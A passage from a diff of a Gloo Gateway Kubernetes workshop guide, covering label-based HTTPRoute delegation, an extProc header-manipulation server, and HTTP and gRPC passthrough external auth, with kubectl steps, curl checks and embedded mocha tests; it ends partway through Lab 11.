+Alternatively, you can delegate `HTTPRoute`s to all namespaces matching labels, as shown below:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: gloo-system
+spec:
+  parentRefs:
+    - name: http
+      namespace: gloo-system
+      sectionName: https-httpbin
+  hostnames:
+    - "httpbin.example.com"
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+      - group: delegation.gateway.solo.io
+        kind: label
+        name: team1
+        namespace: all
+EOF
+```
+
+That means that you can create a child `HTTPRoute` in any namespace, as long as it has the label `delegation.gateway.solo.io/label: team1` it will be delegated to.
+
+Validate that you can still access the application through HTTPS:
+
+Check you can still access the application through HTTPS:
+
+```bash,norun-workshop
+curl -k https://httpbin.example.com/get
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpersHttp = require('./tests/chai-http');
+
+describe("httpbin through HTTPS", () => {
+  it('Checking text \'headers\'', () => helpersHttp.checkBody({ host: `https://httpbin.example.com`, path: '/get', body: 'headers', match: true }));
+})
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/delegation-with-labels/../delegation/tests/https.test.js.liquid from lab number 8"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 8"; exit 1; }
+-->
+
+Let's delete the latest `HTTPRoute` and apply the original ones:
+
+```bash
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: gloo-system
+spec:
+  parentRefs:
+    - name: http
+      namespace: gloo-system
+      sectionName: https-httpbin
+  hostnames:
+    - "httpbin.example.com"
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+        - name: '*'
+          namespace: httpbin
+          group: gateway.networking.k8s.io
+          kind: HTTPRoute
+EOF
+
+kubectl apply --context ${CLUSTER1} -f - <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - matches:
+      - path:
+          type: PathPrefix
+          value: /
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+
+
+
+
+## Lab 9 - Set up an external processing (extProc) server <a name="lab-9---set-up-an-external-processing-(extproc)-server-"></a>
+
+With external processing, you can implement an external gRPC processing server that can read and modify all aspects of an HTTP request or response, such as headers, body, and trailers, and add that server to the Envoy filter chain by using the Envoy external processing (ExtProc) filter. The external service can manipulate headers, body, and trailers of a request or response before it is forwarded to an upstream or downstream service. The request or response can also be terminated at any given time.
+
+With this approach, you have the flexibility to apply your requirements to all types of apps, without the need to run WebAssembly or other custom scripts. 
+
+In this lab we will try to apply an exernal processing server which can be used to add, remove of modify HTTP headers send to httpbin app.
+
+We can enable ExtProc for all requests and responses that the gateway processes by using the Settings custom resource.
+Let us patch in the following values to the spec of the Settings resource to enable ExtProc.
+
+```bash
+kubectl --context $CLUSTER1 patch settings default -n gloo-system --type merge -p "
+spec:
+  extProc:
+    allowModeOverride: false
+    failureModeAllow: false
+    filterStage:
+      predicate: After
+      stage: AuthZStage
+    grpcService:
+      extProcServerRef:
+        name: ext-proc-grpc
+        namespace: gloo-system
+    processingMode:
+      requestHeaderMode: SEND
+      responseHeaderMode: SKIP
+"
+```
+
+You can find more information on the settings at the [gloo gateway docs site](https://docs.solo.io/gateway/latest/traffic-management/extproc/about/).
+
+Now we will setup an extProc server in the cluster. This example uses a prebuilt extProc server that manipulates request and response headers based on values that are sent in an `instructions` header.
+```bash
+kubectl --context $CLUSTER1 apply -n gloo-system -f- <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: ext-proc-grpc
+spec:
+  selector:
+    matchLabels:
+      app: ext-proc-grpc
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: ext-proc-grpc
+    spec:
+      containers:
+        - name: ext-proc-grpc
+          image: gcr.io/product-excellence-424719/ext-proc-example-basic-sink:0.0.3
+          imagePullPolicy: IfNotPresent
+          ports:
+            - containerPort: 18080
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: ext-proc-grpc
+  labels:
+    app: ext-proc-grpc
+  annotations:
+    gloo.solo.io/h2_service: "true"
+spec:
+  ports:
+  - port: 4444
+    targetPort: 18080
+    protocol: TCP
+  selector:
+    app: ext-proc-grpc
+EOF
+```
+
+The `instructions` header must be provided as a JSON string in the following format:
+```json
+{
+  "addHeaders": {
+    "Header1": "value1",
+  },
+  "removeHeaders": [ "Header2" ],
+  }
+}
+```
+
+Verify that extproc is running
+```bash,norun-workshop
+kubectl get pods -n gloo-system | grep ext-proc-grpc
+```
+
+```log,nocopy
+ext-proc-grpc-7bf7964676-xzlbd     1/1     Running   0          6m19s
+```
+
+<!--bash
+cat <<'EOF' > ./test.js
+const helpers = require('./tests/chai-exec');
+
+describe("extProc application", () => {
+  it('is running', () => helpers.checkDeployment({ context: process.env.CLUSTER1, namespace: "gloo-system", k8sObj: "ext-proc-grpc" }));
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-extproc.test.js.liquid from lab number 9"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+-->
+
+Let's create an `Upstream` object to define how to access the `extProc` service.
+```bash
+kubectl --context $CLUSTER1 apply -n gloo-system -f- <<EOF
+apiVersion: gloo.solo.io/v1
+kind: Upstream
+metadata:
+  labels:
+    app: ext-proc-grpc
+    discovered_by: kubernetesplugin
+  name: ext-proc-grpc
+  namespace: gloo-system
+spec:
+  discoveryMetadata: {}
+  useHttp2: true
+  kube:
+    selector:
+      app: ext-proc-grpc
+    serviceName: ext-proc-grpc
+    serviceNamespace: gloo-system
+    servicePort: 4444
+EOF
+```
+<!--bash
+echo "Waiting for 10 seconds..."
+sleep 10
+-->
+We should already have a parent `httpbin` route delegated to this step. Let us send a request with `Instructions` to add `Header2` with value `value2` and test if extProc is setup and working properly.
+
+```bash,norun-workshop
+curl -k -H "Header1: value1" -H 'Instructions:{"addHeaders":{"Header2":"value2"}}' https://httpbin.example.com/get
+```
+
+We will observe that the output will have `Header1` with value `value1` and `Header2` with `value2` and also the `Instructions` header.
+```json,nocopy
+{
+  "args": {},
+  "headers": {
+    "Accept": [
+      "*/*"
+    ],
+    "Header1": [
+      "value1"
+    ],
+    "Header2": [
+      "value2"
+    ],
+    "Instructions": [
+      "{\"addHeaders\":{\"Header2\":\"value2\"}}"
+    ],
+    "Host": [
+      "httpbin.example.com"
+    ],
+    "User-Agent": [
+      "curl/8.5.0"
+    ],
+    "X-Envoy-Expected-Rq-Timeout-Ms": [
+      "15000"
+    ],
+    "X-Forwarded-Proto": [
+      "https"
+    ],
+    "X-Request-Id": [
+      "e9a92e66-6434-4bf0-a835-ba6479b33031"
+    ]
+  },
+  "method": "GET",
+  "origin": "10.101.0.20:52140",
+  "url": "https://httpbin.example.com/get"
+}
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+var chai = require('chai');
+const { debugLog } = require("../../default/tests/utils/logging");
+var expect = chai.expect;
+chai.use(chaiExec);
+
+afterEach(function (done) {
+  if (this.currentTest.currentRetry() > 0) {
+    process.stdout.write(".");
+    setTimeout(done, 1000);
+  } else {
+    done();
+  }
+});
+
+describe("extProc is processing headers properly", function() {
+  const command = `curl -s -H "Header1: value1" -H 'Instructions: {"addHeaders": {"Header2": "value2"} }' -k "https://httpbin.example.com/get"`;
+  debugLog(`Curl Command is: ${command}`);
+  const cli = chaiExec(command);
+  try {
+    JSON.parse(cli.stdout);
+  } catch(error) {
+    debugLog(`Stdout from Curl:\n${cli.stdout}`);
+    debugLog(`Stderr from Curl:\n${cli.stderr}`);
+  }
+  const headersToCheck = [{key: "Header1", value: "value1"}, {key: "Header2", value: "value2"}];
+  const curlOutput = JSON.parse(cli.stdout);
+  debugLog(`Response:\n${cli.stdout}`);
+  headersToCheck.forEach(header => {
+    const match = header.match ?? true;
+    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
+    if (header.value === '*' ) {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
+        });
+      } else {
+        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.be.undefined;
+        });
+      };
+    } else {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.contain(header.value);
+        });
+      } else {
+        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
+        });
+      };
+    };
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+-->
+
+Now let us try removing the `Instructions` header as that header is only meant for extProc and not the destination `httpbin` server itself.
+
+```bash,norun-workshop
+curl -k -H "Header1: value1" -H 'Instructions:{"addHeaders":{"Header2":"value2"},"removeHeaders":["instructions"]}' https://httpbin.example.com/get
+```
+
+We will observe that the header `Instructions` no longer appears in the output from httpbin app.
+```json,nocopy
+{
+  "args": {},
+  "headers": {
+    "Accept": [
+      "*/*"
+    ],
+    "Header1": [
+      "value1"
+    ],
+    "Header2": [
+      "value2"
+    ],
+    "Host": [
+      "httpbin.example.com"
+    ],
+    "User-Agent": [
+      "curl/8.5.0"
+    ],
+    "X-Envoy-Expected-Rq-Timeout-Ms": [
+      "15000"
+    ],
+    "X-Forwarded-Proto": [
+      "https"
+    ],
+    "X-Request-Id": [
+      "245facc7-b874-45b4-8c32-b73e1b3eee3d"
+    ]
+  },
+  "method": "GET",
+  "origin": "10.101.0.4:60420",
+  "url": "https://httpbin.example.com/get"
+}
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+var chai = require('chai');
+const { debugLog } = require("../../default/tests/utils/logging");
+var expect = chai.expect;
+chai.use(chaiExec);
+
+afterEach(function (done) {
+  if (this.currentTest.currentRetry() > 0) {
+    process.stdout.write(".");
+    setTimeout(done, 1000);
+  } else {
+    done();
+  }
+});
+
+describe("extProc is processing headers properly", function() {
+  const command = `curl -s -H "Header1: value1" -H 'Instructions: {"addHeaders": {"Header2": "value2"},"removeHeaders":["Instructions"]}' -k "https://httpbin.example.com/get"`;
+  debugLog(`Curl Command is: ${command}`);
+  const cli = chaiExec(command);
+  try {
+    JSON.parse(cli.stdout);
+  } catch(error) {
+    debugLog(`Stdout from Curl:\n${cli.stdout}`);
+    debugLog(`Stderr from Curl:\n${cli.stderr}`);
+  }
+  const headersToCheck = [{key: "Header1", value: "value1"}, {key: "Header2", value: "value2"}, {key: "Instructions", value: "*", match: false}];
+  const curlOutput = JSON.parse(cli.stdout);
+  debugLog(`Response:\n${cli.stdout}`);
+  headersToCheck.forEach(header => {
+    const match = header.match ?? true;
+    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
+    if (header.value === '*' ) {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
+        });
+      } else {
+        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.be.undefined;
+        });
+      };
+    } else {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.contain(header.value);
+        });
+      } else {
+        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
+        });
+      };
+    };
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+-->
+
+For the next exercise we will try to override the gateway settings using `RouteOption`. In this example we want to skip sending request headers to the extProc server. First we will create the `RouteOption` resource with an override to skip sending headers.
+```bash
+kubectl --context $CLUSTER1 apply -f- <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: ext-proc-grpc
+  namespace: httpbin
+spec:
+  options:
+    extProc:
+      overrides:
+        processingMode:
+          requestHeaderMode: SKIP
+EOF
+```
+
+After that we will create a child `HTTPRoute` resource that references the `RouteOption` we created above.
+```bash
+kubectl apply --context $CLUSTER1 -f- <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - filters:
+        - type: ExtensionRef
+          extensionRef:
+            group: gateway.solo.io
+            kind: RouteOption
+            name: ext-proc-grpc
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+<!--bash
+echo "Waiting for 10 seconds..."
+sleep 10
+-->
+
+Now let us try send a curl request with `Instructions` to add a header `Header3` with value `value3`.
+```
+curl -k -H 'Instructions:{"addHeaders":{"Header3":"value3"},"removeHeaders":["instructions"]}' https://httpbin.example.com/get
+```
+
+We will notice that the extProc server has skipped processing the header. We will see that header `Header1` wasn't sent to the httpbin server. We will also notice that the `Instructions` header was sent to the extProc server unmodified.
+```json,nocopy
+{
+  "args": {},
+  "headers": {
+    "Accept": [
+      "*/*"
+    ],
+    "Instructions": [
+      "{\"addHeaders\":{\"Header1\":\"value1\"}}"
+    ],
+    "Host": [
+      "httpbin.example.com"
+    ],
+    "User-Agent": [
+      "curl/8.5.0"
+    ],
+    "X-Envoy-Expected-Rq-Timeout-Ms": [
+      "15000"
+    ],
+    "X-Forwarded-Proto": [
+      "https"
+    ],
+    "X-Request-Id": [
+      "e9a92e66-6434-4bf0-a835-ba6479b33031"
+    ]
+  },
+  "method": "GET",
+  "origin": "10.101.0.20:52140",
+  "url": "https://httpbin.example.com/get"
+}
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+var chai = require('chai');
+const { debugLog } = require("../../default/tests/utils/logging");
+var expect = chai.expect;
+chai.use(chaiExec);
+
+afterEach(function (done) {
+  if (this.currentTest.currentRetry() > 0) {
+    process.stdout.write(".");
+    setTimeout(done, 1000);
+  } else {
+    done();
+  }
+});
+
+describe("extProc is processing headers properly", function() {
+  const command = `curl -s -H 'Instructions: {"addHeaders": {"Header3": "value3"},"removeHeaders":["Instructions"]}' -k "https://httpbin.example.com/get"`;
+  debugLog(`Curl Command is: ${command}`);
+  const cli = chaiExec(command);
+  try {
+    JSON.parse(cli.stdout);
+  } catch(error) {
+    debugLog(`Stdout from Curl:\n${cli.stdout}`);
+    debugLog(`Stderr from Curl:\n${cli.stderr}`);
+  }
+  const headersToCheck = [{key: "Header3", value: "*", match: false}, {key: "Instructions", value: "*", match: true}];
+  const curlOutput = JSON.parse(cli.stdout);
+  debugLog(`Response:\n${cli.stdout}`);
+  headersToCheck.forEach(header => {
+    const match = header.match ?? true;
+    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
+    if (header.value === '*' ) {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
+        });
+      } else {
+        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.be.undefined;
+        });
+      };
+    } else {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.contain(header.value);
+        });
+      } else {
+        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
+        });
+      };
+    };
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+-->
+
+For the next test, we will reconfigure the `RouteOption` resource so that it will process headers again.
+```bash
+kubectl --context $CLUSTER1 apply -f- <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: ext-proc-grpc
+  namespace: httpbin
+spec:
+  options:
+    extProc:
+      overrides:
+        processingMode:
+          requestHeaderMode: SEND
+EOF
+```
+<!--bash
+echo "Waiting for 10 seconds..."
+sleep 10
+-->
+
+Let us resend the last curl request with `Instructions` to add a header `Header3` with value `value3`.
+```
+curl -k -H 'Instructions:{"addHeaders":{"Header3":"value3"},"removeHeaders":["instructions"]}' https://httpbin.example.com/get
+```
+This time will see the header `Header3` with value `value3` in the list of headers sent to the httpbin server, but the header `Instructions` will be missing.
+
+```json,nocopy
+{
+  "args": {},
+  "headers": {
+    "Accept": [
+      "*/*"
+    ],
+    "Header3": [
+      "value3"
+    ],
+    "Host": [
+      "httpbin.example.com"
+    ],
+    "User-Agent": [
+      "curl/8.5.0"
+    ],
+    "X-Envoy-Expected-Rq-Timeout-Ms": [
+      "15000"
+    ],
+    "X-Forwarded-Proto": [
+      "https"
+    ],
+    "X-Request-Id": [
+      "e9a92e66-6434-4bf0-a835-ba6479b33031"
+    ]
+  },
+  "method": "GET",
+  "origin": "10.101.0.20:52140",
+  "url": "https://httpbin.example.com/get"
+}
+```
+<!--bash
+cat <<'EOF' > ./test.js
+const chaiExec = require("@jsdevtools/chai-exec");
+var chai = require('chai');
+const { debugLog } = require("../../default/tests/utils/logging");
+var expect = chai.expect;
+chai.use(chaiExec);
+
+afterEach(function (done) {
+  if (this.currentTest.currentRetry() > 0) {
+    process.stdout.write(".");
+    setTimeout(done, 1000);
+  } else {
+    done();
+  }
+});
+
+describe("extProc is processing headers properly", function() {
+  const command = `curl -s -H 'Instructions: {"addHeaders": {"Header3": "value3"},"removeHeaders":["Instructions"]}' -k "https://httpbin.example.com/get"`;
+  debugLog(`Curl Command is: ${command}`);
+  const cli = chaiExec(command);
+  try {
+    JSON.parse(cli.stdout);
+  } catch(error) {
+    debugLog(`Stdout from Curl:\n${cli.stdout}`);
+    debugLog(`Stderr from Curl:\n${cli.stderr}`);
+  }
+  const headersToCheck = [{key: "Header3", value: "value3", match: true}, {key: "Instructions", value: "*", match: false}];
+  const curlOutput = JSON.parse(cli.stdout);
+  debugLog(`Response:\n${cli.stdout}`);
+  headersToCheck.forEach(header => {
+    const match = header.match ?? true;
+    debugLog(`Parsing for '${header.key}:${header.value}:${match}'`);
+    if (header.value === '*' ) {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.be.undefined;
+        });
+      } else {
+        it(`Validating that header '${header.key}' was NOT received by the httpbin server`, () => {
+          expect(curlOutput["headers"][header.key]).to.be.undefined;
+        });
+      };
+    } else {
+      if (match) {
+        it(`Validating that header '${header.key}' was received by the httpbin server with value containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.contain(header.value);
+        });
+      } else {
+        it(`Validating that header '${header.key}' was received by the httpbin value with value NOT containing '${header.value}'`, () => {
+          expect(curlOutput["headers"][header.key]).to.not.contain(header.value);
+        });
+      };
+    };
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extproc/tests/check-headers.test.js.liquid from lab number 9"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=20 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 9"; exit 1; }
+-->
+
+Let's delete the child `HTTProute`,`RouteOption` and `Upstream` we've created for this lab:
+
+```bash
+kubectl --context $CLUSTER1 -n httpbin delete httproute httpbin
+kubectl --context $CLUSTER1 -n httpbin delete routeoption ext-proc-grpc
+kubectl --context $CLUSTER1 -n gloo-system delete upstream ext-proc-grpc
+```
+
+Finally we will also remove the custom extProc service, deployment and remove the `extProc` references in the `settings` resource:
+
+```bash
+kubectl --context $CLUSTER1 -n gloo-system delete service -l app=ext-proc-grpc
+kubectl --context $CLUSTER1 -n gloo-system delete deploy ext-proc-grpc
+kubectl --context $CLUSTER1 -n gloo-system patch settings default --type=json -p="[{'op': 'remove', 'path':'/spec/extProc'}]"
+```
+
+
+
+## Lab 10 - Deploy and test using an external HTTP passthrough auth server <a name="lab-10---deploy-and-test-using-an-external-http-passthrough-auth-server-"></a>
+
+In this lab, we will authenticate requests with an external http service. The http service implements [Envoy's Authorization Service API](https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/security/ext_authz_filter.html) to authenticate requests.
+
+For this example, we will use a [sample http service](https://github.com/solo-io/gloo/tree/main/docs/examples/http-passthrough-auth) that will check whether the requests have a certain header, and we will allow them based on this logic.
+
+You can use your own custom service instead of this, but for now deploy this one:
+```bash
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: httpbin-extauth-httpservice
+  namespace: httpbin
+spec:
+  selector:
+    matchLabels:
+      app: http-extauth
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: http-extauth
+    spec:
+      containers:
+        - name: http-extauth
+          image: gcr.io/product-excellence-424719/passthrough-http-service-example:latest
+          imagePullPolicy: IfNotPresent
+          ports:
+            - containerPort: 9001
+          env:
+            - name: REQUEST_LOGGING
+              value: "true"
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: example-http-auth-service
+  namespace: httpbin
+  labels:
+    app: http-extauth
+spec:
+  ports:
+  - port: 9001
+    protocol: TCP
+  selector:
+    app: http-extauth
+EOF
+kubectl -n httpbin wait --for=condition=ready pod -l app=http-extauth
+```
+
+Validate that the service is running:
+
+```bash,norun-workshop
+kubectl --context cluster1 -n httpbin get all -l app=http-extauth 
+```
+
+Here is the expected output:
+
+```log,nocopy
+NAME                                               READY   STATUS    RESTARTS   AGE
+pod/httpbin-extauth-httpservice-689dd8f775-99rsh   1/1     Running   0          11s
+
+NAME                                TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)    AGE
+service/example-http-auth-service   ClusterIP   10.1.128.52   <none>        9001/TCP   11s
+
+NAME                                                     DESIRED   CURRENT   READY   AGE
+replicaset.apps/httpbin-extauth-httpservice-689dd8f775   1         1         1       11s
+```
+
+Now setup the `AuthConfig` resource and add our external authentication rules.
+
+```bash
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: enterprise.gloo.solo.io/v1
+kind: AuthConfig
+metadata:
+  name: httpbin1-http-passthrough-auth
+  namespace: httpbin
+spec:
+  configs:
+    - passThroughAuth:
+        http:
+          url: http://example-http-auth-service.httpbin.svc.cluster.local:9001/auth
+          connectionTimeout: 3s
+          request:
+            allowedHeaders:
+            - authorization
+EOF
+```
+
+Next we will create a `RouteOption` resource and reference the `AuthConfig` resource that we just created.
+
+```bash
+kubectl apply -f- <<EOF
+apiVersion: gateway.solo.io/v1
+kind: RouteOption
+metadata:
+  name: httpbin1-http-passthrough-auth
+  namespace: httpbin
+spec:
+  options:
+    extauth:
+      configRef:
+        name: httpbin1-http-passthrough-auth
+        namespace: httpbin
+EOF
+```
+
+After that we will create `HTTPRoute` resource for the httpbin1 app that requires authentication for requests on the `httpbin.example.com` domain.
+
+```bash
+kubectl apply --context cluster1 -f- <<EOF
+apiVersion: gateway.networking.k8s.io/v1
+kind: HTTPRoute
+metadata:
+  name: httpbin
+  namespace: httpbin
+spec:
+  rules:
+    - filters:
+        - type: ExtensionRef
+          extensionRef:
+            group: gateway.solo.io
+            kind: RouteOption
+            name: httpbin1-http-passthrough-auth
+      backendRefs:
+        - name: httpbin1
+          port: 8000
+EOF
+```
+Configure your hosts file to resolve `httpbin.example.com` with the IP address of the proxy by executing the following command:
+
+```bash
+INGRESS_GW_ADDRESS=$(kubectl --context cluster1 -n gloo-system get svc gloo-proxy-http -o jsonpath='{.status.loadBalancer.ingress[0].ip}{.status.loadBalancer.ingress[0].hostname}')
+./scripts/register-domain.sh "httpbin.example.com" ${INGRESS_GW_ADDRESS}
+```
+
+Try to access the endpoint `httpbin.example.com` without any additional headers in the request. You should get a `401` response, as you are not passing the required authorization header.
+```bash,norun-workshop
+curl -ks "https://httpbin.example.com/status/200" -o /dev/null -w "%{http_code}"
+```
+<!--bash
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing http-passthrough-auth without authorization header should return a 401", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}'"});
+    expect(command).to.contain("401");
+  });
+  
+  it("Accessing http-passthrough-auth with a BAD authorization header should return a 401", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: deny me'"});
+    expect(command).to.contain("401");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-http-passthrough-auth/tests/http-passthrough-not-authorized.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+-->
+
+Now send the header required by the http passthrough service `authorization: authorize me`. This should return a `200` response.
+```bash,norun-workshop
+curl -ks "https://httpbin.example.com/status/200" -o /dev/null -w "%{http_code}" -H "authorization: authorize me"
+```
+<!--bash
+cat <<'EOF' > ./test.js
+var chai = require('chai');
+var expect = chai.expect;
+const helpers = require('./tests/chai-exec');
+
+describe("Communication status", () => {
+  it("Accessing http-passthrough-auth with authorization header should return a 200", () => {
+    const command = helpers.getOutputForCommand({ command: "curl -ks https://httpbin.example.com/status/200 -s -o /dev/null -w '%{http_code}' -H 'authorization: authorize me'"});
+    expect(command).to.contain("200");
+  });
+});
+EOF
+echo "executing test dist/gloo-gateway-workshop/build/templates/steps/apps/httpbin/extauth-http-passthrough-auth/tests/http-passthrough-authorized.liquid from lab number 10"
+timeout --signal=INT 3m mocha ./test.js --timeout 10000 --retries=120 --bail --exit || { DEBUG_MODE=true mocha ./test.js --timeout 120000; echo "The workshop failed in lab number 10"; exit 1; }
+-->
+
+You should see the request going through successfully now!
+
+In case if you do not get a status of `200`, you can take a peek at the logs of the http passthrough service to view the contents of the HTTP request to help with troubleshooting.
+```bash,norun-workshop
+kubectl --context cluster1 -n httpbin logs -f deploy/httpbin-extauth-httpservice
+```
+
+Here is a sample of how the logs from the pod may look like:
+
+```log,nocopy
+Listening on port 9001 for auth requests
+received request with url: /auth, with headers map[Accept-Encoding:[gzip] Content-Length:[0] User-Agent:[Go-http-client/1.1]]
+2025/04/22 16:20:34 request:
+POST /auth HTTP/1.1
+Host: example-http-auth-service.httpbin.svc.cluster.local:9001
+Accept-Encoding: gzip
+Content-Length: 0
+User-Agent: Go-http-client/1.1
+
+received request with url: /auth, with headers map[Accept-Encoding:[gzip] Authorization:[authorize me] Content-Length:[0] User-Agent:[Go-http-client/1.1]]
+2025/04/22 16:20:35 request:
+POST /auth HTTP/1.1
+Host: example-http-auth-service.httpbin.svc.cluster.local:9001
+Accept-Encoding: gzip
+Authorization: authorize me
+Content-Length: 0
+User-Agent: Go-http-client/1.1
+```
+
+Let's delete the `HTTProute`,`RouteOption` and `AuthConfig` we've created for this lab:
+
+```bash
+kubectl --context cluster1 -n httpbin delete httproute httpbin
+kubectl --context cluster1 -n httpbin delete routeoption httpbin1-http-passthrough-auth
+kubectl --context cluster1 -n httpbin delete authconfig httpbin1-http-passthrough-auth
+```
+
+Finally we will also remove the custom http passthrough auth service as well:
+
+```bash
+kubectl --context cluster1 -n httpbin delete service -l app=http-extauth
+kubectl --context cluster1 -n httpbin delete deploy httpbin-extauth-httpservice
+```
+
+
+
+## Lab 11 - Deploy and test using an external gRPC passthrough auth server <a name="lab-11---deploy-and-test-using-an-external-grpc-passthrough-auth-server-"></a>
+
+In this lab, we will authenticate requests with an external gRPC service. The gRPC service implements [Envoy's Authorization Service API](https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/security/ext_authz_filter.html) to authenticate requests.
+
+For this example, we will use a [sample gRPC service](https://github.com/solo-io/gloo/tree/main/docs/examples/grpc-passthrough-auth) that will check whether the requests have a certain header, and we will allow them based on this logic.
+
+You can use your own custom service instead of this, but for now deploy this one:
+```bash
+kubectl --context cluster1 apply -f - <<EOF
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: httpbin-extauth-grpcservice
+  namespace: httpbin
+spec:
+  selector:
+    matchLabels:
+      app: grpc-extauth
+  replicas: 1
+  template:
+    metadata:
+      labels:
+        app: grpc-extauth
+    spec:
+      containers:
+        - name: grpc-extauth
+          image: gcr.io/product-excellence-424719/passthrough-grpc-service-example:latest
+          imagePullPolicy: IfNotPresent
+          ports:
